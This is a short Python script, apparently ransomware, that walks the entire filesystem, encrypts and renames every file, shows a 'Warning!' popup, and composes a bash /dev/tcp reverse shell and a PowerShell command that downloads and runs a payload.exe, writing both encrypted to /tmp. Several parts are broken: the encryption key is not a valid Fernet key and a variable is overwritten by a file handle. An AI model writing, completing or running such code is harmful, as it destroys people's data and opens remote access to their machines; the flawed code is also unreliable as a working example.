import os
import platform
import random
import string
import shutil
import subprocess
import hashlib
import webbrowser
from cryptography.fernet import Fernet

key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))

def encrypt_files():
    for root, dirs, files in os.walk('/'):
        for file in files:
            file_name = os.path.join(root, file)
            f = Fernet(key)
            with open(file_name, 'rb') as f:
                file_data = f.read()
            encrypted_data = f.encrypt(file_data)
            with open(file_name, 'wb') as f:
                f.write(encrypted_data)
            os.rename(file_name, file_name + '.encrypted')

def create_popup():
    popup_message = """
        Warning!
                    """
    subprocess.Popen(['zenity', '--info', '--text={}'.format(popup_message)])

def create_reverse_shell():
    operating_system = platform.system()
    if operating_system == 'Linux':
        shell_command = 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
    elif operating_system == 'Windows':
        shell_command = 'powershell -nop -exec bypass -c "Invoke-WebRequest -Uri http://127.0.0.1:4444/ -OutFile C:\\Windows\\Temp\\payload.exe; Start-Process C:\\Windows\\Temp\\payload.exe"'

    key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))

    f = Fernet(key)
    encrypted_command = f.encrypt(shell_command.encode())

    file_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
    with open('/tmp/{}'.format(file_name), 'wb') as f:
        f.write(encrypted_command)

def connect_to_random_tor_website():
    key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))

    operating_system = platform.system()
    if operating_system == 'Linux':
        shell_command = 'curl --socks5 127.0.0.1:9050 https://www.example.com'
    elif operating_system == 'Windows':
        shell_command = 'powershell -nop -exec bypass -c "Invoke-WebRequest -Uri http://127.0.0.1:9050/ -OutFile C:\\Windows\\Temp\\payload.exe; Start-Process C:\\Windows\\Temp\\payload.exe"'

    f = Fernet(key)
    encrypted_command = f.encrypt(shell_command.encode())

    file_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
    with open('/tmp/{}'.format(file_name), 'wb') as f:
        f.write(encrypted_command)

def main():
    encrypt_files()
    create_popup()
    create_reverse_shell()
    connect_to_random_tor_website()

if __name__ == '__main__':
    main()
